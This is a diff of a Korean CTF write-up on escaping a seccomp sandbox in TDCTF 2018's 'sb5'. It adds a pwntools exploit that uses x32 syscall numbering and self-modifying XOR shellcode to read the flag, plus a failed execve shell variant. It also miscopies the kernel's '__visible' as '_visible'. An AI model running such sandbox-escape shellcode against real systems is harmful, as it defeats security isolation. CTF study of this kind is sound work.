@@ -16,6 +16,7 @@ tags: shellcode, seccomp, sandbox, sandbox_escape
 ## Introduction
 
 TDCTF 2018이 cloud폴더에 있길래..(?) 풀었다. ~~언제 넣어놨지;~~
+
 드림핵에서 봤던 sandbox escape 기법이 생각나서 참고하면서 풀게 되었다.
 
 
@@ -358,7 +359,7 @@ static long seccomp_attach_filter(unsigned int flags,
 
 ```c
 #ifdef CONFIG_X86_64
-__visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
+_visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
 {
 	struct thread_info *ti;
 	enter_from_user_mode();
@@ -682,8 +683,9 @@ static long syscall_trace_enter(struct pt_regs *regs)
 다시 `do_syscall_64`로 돌아가서
 
 ```c
+
 #ifdef CONFIG_X86_64
-__visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
+_visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
 {
 	struct thread_info *ti;
 	enter_from_user_mode();
@@ -704,6 +706,7 @@ __visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
 	syscall_return_slowpath(regs);
 }
 #endif
+
 ```
 
 여기서 nr이 -1을 리턴받게 되면 밑의 if문에 걸려서 `regs->ax`를 갱신하지 못하게 된다.
@@ -756,14 +759,83 @@ if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
 
 ## slv.py
 
+```python
+from pwn import *
 
+p = process('./sb5')
 
+context(arch='amd64', os='linux')
+
+payload = ''
+payload += asm(shellcraft.amd64.open('flag',0,0))
+payload = payload.replace('\x0f\x05', '\x90\x90')
+
+s = '''
+mov rax, 0x2
+or rax, 0x40000000
+xor word ptr [rip], 0x959f
+nop
+nop
+'''
+
+payload = payload.replace('\x90\x90', asm(s))
+
+payload2 = ''
+payload2 += asm(shellcraft.amd64.read('rax','rsp',100))
+payload2 += asm(shellcraft.amd64.write(1,'rsp',100))
+
+payload2 = payload2.replace('\x0f\x05', '\x90\x90')
+
+s = '''
+xor word ptr [rip], 0x959f
+nop
+nop
+'''
+payload2 = payload2.replace('\x90\x90', asm(s))
+
+payload += payload2
+
+p.sendlineafter('> ', payload)
+
+p.interactive()
+
+```
+
+풀이는 `open`, `read`, `write`를 써서 풀긴했는데 `execve`를 해당 취약점으로 call을 하면 실행은 되는데 bad syscall이 뜨면서 프로그램이 죽어버린다.
+
+원인을 알아봐야 될것같다.
+
+문제의 코드
+
+```python
+from pwn import *
+
+p = process('./sb5')
+
+context(arch='amd64', os='linux')
+
+payload = ''
+payload += asm(shellcraft.amd64.linux.sh())
+
+s = '''
+mov rax, 0x3b
+or rax, 0x40000000
+xor word ptr [rip], 0x959f
+nop
+nop
+'''
+
+p.sendlineafter('> ', payload)
+
+p.interactive()
+
+```
 
 
 ## 느낀 점
 
 역시 커널을 뜯어보고 커널 디버깅도 해야되겠다는걸 다시금 느낀다.
-요새 알고리즘을 공부한답시고 공부를 너무 안해서 다시 공부모드로 돌아가야겠다. ~~말년이라 더 공부안되쥬~~
+요새 알고리즘을 공부한답시고 공부를 너무 안해서 다시 공부모드로 돌아가야겠다. ~~하지만 말년이라 더 공부안되쥬 ㅋㅋ~~
 
 
 ## Reference
